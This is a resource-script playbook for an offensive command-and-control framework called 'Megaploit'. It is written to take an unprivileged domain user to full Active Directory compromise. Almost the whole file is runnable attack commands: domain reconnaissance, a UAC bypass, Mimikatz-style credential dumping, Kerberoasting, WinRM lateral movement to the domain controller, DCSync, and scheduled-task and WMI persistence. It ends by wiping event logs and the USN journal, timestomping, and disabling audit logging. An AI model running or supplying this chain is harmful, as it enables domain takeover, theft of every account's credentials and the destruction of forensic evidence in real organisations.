# ===========================================================================
# Megaploit Community Playbook
# ===========================================================================
# Name        : ad-full-compromise
# Version     : 1.1
# Author      : megaploit-community
# Tested on   : Windows 10 21H2, Windows Server 2019, Server 2022
# Description : Full Active Directory compromise chain — unprivileged domain
#               user foothold to Domain Admin via Kerberoasting and DCSync.
#
# MITRE ATT&CK
# ------------
# T1033   System Owner/User Discovery
# T1082   System Information Discovery
# T1016   System Network Configuration Discovery
# T1087.002 Account Discovery: Domain Account
# T1548.002 Abuse Elevation Control Mechanism: Bypass UAC (sdclt)
# T1003.001 OS Credential Dumping: LSASS Memory
# T1003.002 OS Credential Dumping: SAM
# T1003.006 OS Credential Dumping: DCSync
# T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting
# T1550.002 Use Alternate Authentication Material: Pass the Hash
# T1021.006 Remote Services: Windows Remote Management
# T1053.005 Scheduled Task/Job: Scheduled Task
# T1546.003 Event Triggered Execution: Windows Management Instrumentation
# T1070.001 Indicator Removal: Clear Windows Event Logs
# T1070.004 Indicator Removal: File Deletion
# T1099   Timestomp
#
# Variables
# ---------
#   ${SESSION}  — session ID of the initial foothold beacon
#   ${LHOST}    — your C2 listener IP
#   ${DOMAIN}   — target domain FQDN  (e.g. corp.local)
#   ${DC}       — domain controller IP or hostname
#
# Usage
# -----
#   community install playbook ad-full-compromise
#   resource community/playbooks/ad-full-compromise.rc
#
# Phases
# ------
#   0  Listener (skip if already running)
#   1  Situational awareness
#   2  Local privilege escalation
#   3  Credential harvest
#   4  Kerberoasting
#   5  Lateral movement to DC
#   6  DCSync — full domain dump
#   7  Persistence
#   8  Evidence suppression
# ===========================================================================

# ── Phase 0: Listener (skip if already configured) ─────────────────────────
# listener add https ${LHOST} 443

# ── Phase 1: Situational Awareness ─────────────────────────────────────────
session ${SESSION}
shell whoami /all
shell hostname
shell systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Domain"
shell ipconfig /all
shell net user /domain
shell net group "Domain Admins" /domain
shell net group "Domain Controllers" /domain
shell net group "Enterprise Admins" /domain

# ── Phase 2: Local Privilege Escalation ────────────────────────────────────
post/windows/privesc/uac_sdclt
# Fallback — check weak service paths
shell wmic service get name,pathname,startmode | findstr /i "auto" | findstr /v "C:\\Windows\\"

# ── Phase 3: Credential Harvest ────────────────────────────────────────────
kiwi logonpasswords
kiwi sam
kiwi lsa
kiwi dpapi
kiwi credman

# ── Phase 4: Kerberoasting ──────────────────────────────────────────────────
shell setspn -Q */* -T ${DOMAIN} 2>nul
kiwi tickets

# ── Phase 5: Lateral Movement to Domain Controller ─────────────────────────
lateral_winrm ${DC} administrator
# After the new session lands, switch to it and verify access:
# session <new_id>
# shell net localgroup administrators

# ── Phase 6: DCSync ─────────────────────────────────────────────────────────
kiwi dcsync ${DOMAIN}
kiwi lsa

# ── Phase 7: Persistence ───────────────────────────────────────────────────
post/windows/privesc/schtask_persist
post/windows/privesc/wmi_persist

# ── Phase 8: Evidence Suppression ──────────────────────────────────────────
log_wipe Security
log_wipe System
log_wipe Application
usnjrnl_wipe
prefetch_clear
timestomp C:\Windows\System32\cmd.exe ${DATE}
audit_disable ProcessCreation

# ── Done ────────────────────────────────────────────────────────────────────
sessions
loot list
